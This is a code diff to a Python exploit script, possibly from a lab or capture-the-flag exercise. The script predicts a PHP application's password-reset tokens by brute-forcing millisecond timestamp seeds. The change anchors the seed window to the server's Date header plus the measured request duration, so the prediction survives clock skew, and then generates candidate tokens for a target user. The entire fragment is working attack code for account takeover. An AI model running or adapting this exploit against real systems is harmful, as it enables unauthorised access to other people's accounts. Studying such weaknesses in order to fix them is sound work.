@@ -51,17 +51,22 @@ def main():
         print(f"[-] Precondition failed: no '{SENT_MARKER}'. User missing or blocked (admin excluded).")
         sys.exit(1)
 
-    # server clock from the Date header (1s resolution) -> skew-proof anchor
+    # Server clock from the Date header. NOTE: Apache stamps Date at request
+    # RECEIPT, and the token is seeded ~one request-duration later (the slow
+    # pg_connect runs first), so anchor the server-side window at srv_ms + dur.
+    # This is skew-proof: it uses server time + client-measured duration only.
     srv_ms = int(parsedate_to_datetime(hdrs["Date"]).timestamp()*1000)
+    dur = ts_hi - ts_lo
+    anchor = srv_ms + dur
 
     # candidate seeds, ordered fast-path first:
     #   1) client window, reversed (instant hit when clocks agree)
-    #   2) server-Date window (catches clock skew), minus overlap
+    #   2) server-anchored window (catches client/WSL2 clock skew), minus overlap
     client = list(range(ts_lo, ts_hi+1))[::-1]
     seen = set(client)
-    date = [s for s in range(srv_ms-300, srv_ms+1300) if s not in seen]
+    date = [s for s in range(anchor-300, anchor+1300) if s not in seen]
     seeds = client + date
-    print(f"[*] Reset for {user} | client window {ts_hi-ts_lo}ms | server-anchored +{len(date)} | {len(seeds)} candidates")
+    print(f"[*] Reset for {user} | client window {dur}ms | server-anchored +{len(date)} | {len(seeds)} candidates")
 
     tokens = [php_token(s) for s in seeds]
 
